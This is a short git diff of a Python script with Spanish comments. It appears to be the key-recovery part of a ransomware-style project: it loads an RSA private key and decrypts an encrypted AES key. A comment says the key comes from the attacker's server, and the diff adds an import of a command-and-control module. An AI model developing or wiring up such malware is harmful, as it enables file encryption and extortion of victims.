@@ -3,7 +3,7 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Util.Padding import unpad
 from find_files import find_files
-
+import agent_c2
 def load_private_rsa_key(): #tiene que llegar a través de una petición al servidor del atacante. 
     ruta_clave_privada = os.path.abspath("rsa_private.pem")
     if os.path.exists(ruta_clave_privada):
@@ -21,6 +21,7 @@ def load_aes_key_encrypted():
         raise FileNotFoundError(f"El archivo de clave AES cifrada no se encuentra en: {ruta_clave_aes}")
 
 def decrypt_aes_key_encrypted (clave_privada, clave_aes_cifrada):
+    
     cipher_rsa = PKCS1_OAEP.new(clave_privada)
     return cipher_rsa.decrypt(clave_aes_cifrada)
 
